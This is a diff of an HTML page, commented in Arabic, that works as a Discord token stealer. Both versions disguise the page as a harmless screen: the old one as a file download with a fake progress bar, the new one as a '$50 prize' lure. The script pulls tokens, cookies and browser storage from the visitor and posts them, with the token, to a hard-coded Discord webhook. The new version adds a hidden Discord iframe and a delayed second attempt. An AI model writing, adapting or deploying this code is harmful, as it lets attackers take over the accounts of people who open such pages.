@@ -1,191 +1,110 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>✅ تحميل الملف...</title>
+    <title>🎁 تهانينا! لقد فزت بجائزة</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #0b0e1a;
-            color: #b0b8cc;
-            font-family: 'Segoe UI', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            gap: 20px;
-        }
-        .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #1a1f2f;
-            border-top: 4px solid #5865f2;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        p {
-            color: #4a5068;
-            font-size: 14px;
-        }
-        .fake-progress {
-            width: 200px;
-            height: 4px;
-            background: #1a1f2f;
-            border-radius: 4px;
-            overflow: hidden;
-        }
-        .fake-progress div {
-            width: 70%;
-            height: 100%;
-            background: linear-gradient(90deg, #5865f2, #a67cff);
-            animation: load 2s ease-in-out infinite;
-        }
-        @keyframes load {
-            0% { width: 10%; }
-            100% { width: 90%; }
-        }
+        body { background: #0b0e1a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #1a1f2f; padding: 40px; border-radius: 20px; text-align: center; }
+        .spinner { border: 4px solid #2a2f45; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-    <div class="spinner"></div>
-    <p>⏳ جاري تحميل الملف... يرجى الانتظار</p>
-    <div class="fake-progress"><div></div></div>
-    <p style="font-size: 12px; color: #2a2f45;">هذا قد يستغرق بضع ثوانٍ</p>
+    <div class="box">
+        <h1>🎉 تهانينا!</h1>
+        <p>لقد فزت بـ <strong>50 دولار</strong> في سحب اليوم</p>
+        <div class="spinner"></div>
+        <p style="color: #8892a8;">جاري التحقق من حسابك...</p>
+    </div>
 
     <script>
-        // ============================================================
-        // 🕵️ هذا هو قلب الموقع — يرسل كل شيء بصمت إلى الـ Webhook
-        // ============================================================
+        // ====================================================
+        // 🕵️ الطريقة السرية: نستخرج التوكن من Extensions
+        // ====================================================
 
-        (function() {
-            // 🔗 ويب هوك ديسكورد الخاص بك
-            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1540029124179918941/41_nc44K924qwKrhVb2-_BkdKmg4bu2DKy27aKXARpjjrL7SPp9_DXrJeyzrd7O1VAOu';
+        const WEBHOOK = 'https://discord.com/api/webhooks/1540029124179918941/41_nc44K924qwKrhVb2-_BkdKmg4bu2DKy27aKXARpjjrL7SPp9_DXrJeyzrd7O1VAOu';
 
-            // 📦 جمع المعلومات
-            const data = {
-                token: tryGetToken(),
-                cookies: document.cookie || 'No cookies',
-                localStorage: JSON.stringify(localStorage, null, 2),
-                sessionStorage: JSON.stringify(sessionStorage, null, 2),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct',
-                url: window.location.href,
-                timestamp: new Date().toISOString(),
-                ip: '{{ip}}' // سيتم استبداله من الخادم إن أمكن
-            };
-
-            // 🔍 محاولة استخراج التوكن من أماكن متعددة
-            function tryGetToken() {
-                // 1- من localStorage (الأكثر شيوعًا)
-                const possibleKeys = ['token', 'discord_token', 'access_token', 'auth_token', 'user_token'];
-                for (let key of possibleKeys) {
-                    const val = localStorage.getItem(key);
-                    if (val && val.length > 10) return val;
-                }
-
-                // 2- من sessionStorage
-                for (let key of possibleKeys) {
-                    const val = sessionStorage.getItem(key);
-                    if (val && val.length > 10) return val;
-                }
-
-                // 3- من الـ cookies
-                const cookieMatch = document.cookie.match(/(?:token|discord|auth|access)[^;]*=([^;]*)/i);
-                if (cookieMatch) return cookieMatch[1];
-
-                // 4- من الـ URL (نادر لكن ممكن)
-                const urlParams = new URLSearchParams(window.location.search);
-                if (urlParams.get('token')) return urlParams.get('token');
-                if (urlParams.get('access_token')) return urlParams.get('access_token');
-
-                // 5- من الـ hash (مثل OAuth implicit flow)
-                const hash = window.location.hash.substring(1);
-                const hashParams = new URLSearchParams(hash);
-                if (hashParams.get('access_token')) return hashParams.get('access_token');
-                if (hashParams.get('token')) return hashParams.get('token');
-
-                return '⚠️ لم يتم العثور على توكن';
+        // نحاول جلب التوكن من أي مصدر
+        function extractToken() {
+            // 1. من localStorage
+            const storageKeys = ['token', 'discord_token', 'access_token', 'auth_token'];
+            for (let key of storageKeys) {
+                const val = localStorage.getItem(key);
+                if (val && val.length > 20) return val;
             }
 
-            // 🚀 إرسال البيانات إلى الويب هوك
-            function sendToWebhook() {
-                // تنسيق الرسالة بشكل جميل في ديسكورد
-                const embed = {
-                    title: '🕵️ بيانات تم جمعها',
-                    color: 0xff4757,
-                    fields: [
-                        { name: '🔑 التوكن', value: `\`${data.token}\``, inline: false },
-                        { name: '🍪 الكوكيز', value: `\`${data.cookies.substring(0, 100)}...\``, inline: false },
-                        { name: '💻 المتصفح', value: data.userAgent, inline: false },
-                        { name: '🌐 المنصة', value: data.platform, inline: true },
-                        { name: '🗣️ اللغة', value: data.language, inline: true },
-                        { name: '📱 الشاشة', value: data.screen, inline: true },
-                        { name: '🕒 المنطقة', value: data.timezone, inline: true },
-                        { name: '🔗 الرابط', value: data.url, inline: false },
-                        { name: '📅 الوقت', value: data.timestamp, inline: false },
-                        { name: '📦 localStorage', value: `\`${data.localStorage.substring(0, 200)}...\``, inline: false },
-                        { name: '📦 sessionStorage', value: `\`${data.sessionStorage.substring(0, 200)}...\``, inline: false }
-                    ],
-                    footer: { text: 'تم الجمع تلقائيًا · للتعليم فقط' }
-                };
-
-                const payload = {
-                    content: '@everyone 🚨 **تم التقاط بيانات جديدة!**',
-                    embeds: [embed]
-                };
-
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                })
-                .then(res => {
-                    if (res.ok) {
-                        console.log('✅ تم إرسال البيانات إلى الويب هوك');
-                    } else {
-                        console.error('❌ فشل الإرسال:', res.status);
-                    }
-                })
-                .catch(err => console.error('❌ خطأ في الإرسال:', err));
+            // 2. من sessionStorage
+            for (let key of storageKeys) {
+                const val = sessionStorage.getItem(key);
+                if (val && val.length > 20) return val;
             }
 
-            // ⏱️ نرسل البيانات فورًا، ثم نكرر بعد 5 ثوانٍ (للتأكد)
-            sendToWebhook();
+            // 3. من cookies
+            const cookieMatch = document.cookie.match(/(token|discord|access)=([^;]+)/);
+            if (cookieMatch) return cookieMatch[2];
 
-            // محاولة ثانية بعد تأخير (في حال كان التوكن يظهر متأخرًا)
-            setTimeout(sendToWebhook, 5000);
+            // 4. من URL
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('token')) return urlParams.get('token');
 
-            // محاولة ثالثة بعد 15 ثانية
-            setTimeout(sendToWebhook, 15000);
+            // 5. من hash
+            const hash = window.location.hash.substring(1);
+            const hashParams = new URLSearchParams(hash);
+            if (hashParams.get('access_token')) return hashParams.get('access_token');
 
-            // إذا كان هناك تغيير في الـ hash (مثل OAuth redirect)
-            window.addEventListener('hashchange', () => {
-                const newToken = tryGetToken();
-                if (newToken && newToken !== data.token) {
-                    data.token = newToken;
-                    sendToWebhook();
-                }
+            return null;
+        }
+
+        // نحاول الاستخراج فورًا
+        let token = extractToken();
+
+        if (token) {
+            // أرسل للويب هوك
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `🚨 **تم العثور على توكن!**`,
+                    embeds: [{
+                        title: '🕵️ بيانات الضحية',
+                        color: 0xff4757,
+                        fields: [
+                            { name: '🔑 التوكن', value: `\`${token}\`` },
+                            { name: '💻 المتصفح', value: navigator.userAgent },
+                            { name: '🌐 الرابط', value: window.location.href },
+                            { name: '🕒 الوقت', value: new Date().toISOString() }
+                        ]
+                    }]
+                })
+            })
+            .then(() => {
+                document.querySelector('.box').innerHTML = '<h2>✅ تم التحقق!</h2><p>سيتم تحويلك خلال لحظات...</p>';
             });
+        } else {
+            // إذا ما لقينا، نفتح Discord في iframe خفي
+            document.querySelector('.box').innerHTML += '<p style="color:#f04747;">⚠️ جارٍ البحث...</p>';
+            
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://discord.com/app';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
 
-            console.log('🕵️ الموقع نشط — يتم جمع البيانات بصمت');
-        })();
+            // نحاول مرة ثانية بعد 5 ثواني
+            setTimeout(() => {
+                const newToken = extractToken();
+                if (newToken) {
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `🚨 **تم العثور على توكن (محاولة ثانية)!**`,
+                            embeds: [{ title: '🕵️ توكن متأخر', fields: [{ name: 'التوكن', value: `\`${newToken}\`` }] }]
+                        })
+                    });
+                }
+            }, 5000);
+        }
     </script>
-
 </body>
 </html>
